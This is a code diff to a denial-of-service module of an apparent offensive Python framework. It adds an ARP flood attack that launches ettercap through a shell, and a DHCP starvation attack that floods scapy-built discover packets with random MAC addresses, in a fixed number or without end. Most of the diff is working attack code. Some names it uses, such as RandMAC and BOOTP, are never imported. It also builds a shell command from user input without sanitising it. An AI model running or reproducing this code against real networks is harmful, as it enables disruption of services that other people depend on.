@@ -13,9 +13,16 @@ try:
     import time
     import socket
     import requests
+    import subprocess
     from core import gethost
     from core import printer
     from core import asciigraphs
+
+    import threading
+    import queue
+    from scapy.all import get_if_raw_hwaddr, Ether, IP
+    from scapy.all import UDP, RandString, DHCP, sendp
+    from scapy.all import conf as confs
 
 except BaseException as err:
     print("While importing dependency modules, an error occured: {0}".format(str(err)))
@@ -60,7 +67,7 @@ class ArchariosFrameworkModule:
                 # Module brief description
                 "bdesc": "A simple Denial-of-Service Tool.",
                 # Module version
-                "version": 1.1,
+                "version": 1.2,
                 # Module author
                 "author": "Catayao56",
                 # Module status
@@ -88,7 +95,8 @@ It is very customizeable so it can suit your needs.
         # Update history
         self.version_history = {
                     1.0: "Initial update",
-                    1.1: "Default attack added."
+                    1.1: "Default attack added.",
+                    1.2: "ARP attack added."
                     }
 
         self._parse_module_info()
@@ -382,27 +390,62 @@ It is very customizeable so it can suit your needs.
                         printer.Printer().print_with_status("xterm not installed!", 2)
                         return 7
 
-                    router_ip = input("Router's IP Address: ")
+                    interface = input("Enter interface name for {0} \
+(e.g. eth0): ".format(values['target']))
+                    router_ip = input("Enter router's IP Address: ")
+
                     try:
-                        conn = self.get_socket_obj(values['protocol'])
-                        conn.connect((router_ip, values['port']))
-                        conn.sendall(random._urandom(1))
-                        recieved_data = conn.recv(1024)
+                        arpflood_command = "xterm -e ettercap -i {0} -Tq -P rand_flood /{1}// /{2}//".format(
+                                interface,
+                                router_ip,
+                                values['target'])
+                        subprocess.Popen(arpflood_command,
+                                stderr=subprocess.PIPE,
+                                stdout=subprocess.PIPE,
+                                shell=True)
+                        printer.Printer().print_with_status("Press enter or CTRL+C \
+to stop attack.", 0)
+                        misc.ProgramFunctions().pause()
+                        raise KeyboardInterrupt
 
                     except Exception as err:
                         printer.Printer().print_with_status(str(err), 2)
                         return 8
 
-                    else:
-                        if len(recieved_data) == 0:
-                            printer.Printer(
-                                    ).print_with_status("Cannot connect to router!", 2)
-                            return 9
+                except(KeyboardInterrupt, EOFError):
+                    printer.Printer().print_with_status("Attack stopped.", 1)
+                    result = subprocess.getstatusoutput('killall ettercap')
+                    if result[0] == 0:
+                        return 0
 
-                        else:
-                            pass
+                    else:
+                        printer.Printer().print_with_status("Cannot kill ettercap! \
+Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1)
+                        return 0
+
+            elif values['attack_mode'].lower() == 'dhcp':
+                last = values['packet_size']
+
+                threads = []
+                try:
+                    if last != 0:
+                        for i in range(0, last):
+                            DHCPr = DHCPRequest(values['target'], i + 2)
+                            DHCPr.start()
+                            threads.append(DHCPr)
+
+                    else:
+                        i = 2
+                        while True:
+                            DHCPr = DHCPRequest(values['target'], i)
+                            DHCPr.start()
+                            threads.append(DHCPr)
+                            i += 1
 
                 except(KeyboardInterrupt, EOFError):
+                    for thread in threads:
+                        thread.join()
+
                     printer.Printer().print_with_status("Attack stopped.", 1)
                     return 0
 
@@ -521,3 +564,25 @@ It is very customizeable so it can suit your needs.
         else:
             printer.Printer().print_with_status("Invalid protocol! Aborting attack.", 2)
             raise exceptions.InvalidParameterError()
+
+
+class DHCPRequest(threading.Thread):
+    last = 0
+    router = None
+
+    def __init__(self, router, last):
+        self.router = router
+        self.last = str(last)
+        threading.Thread.__init__(self)
+
+    def run(self):
+        baseip = ".".join(self.router.split('.')[0:-1]) + '.'
+        targetip = baseip+self.last
+        confs.checkIPaddr = False
+        hw = get_if_raw_hwaddr(confs.iface)
+        dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/\
+                IP(src="0.0.0.0",dst="255.255.255.255")/\
+                UDP(sport=68, dport=67)/\
+                BOOTP(chaddr=RandString(RandNum(1,50)))/\
+                DHCP(options=[("message-type","discover"),"end"])
+        sendp(dhcp_discover, verbose=0)
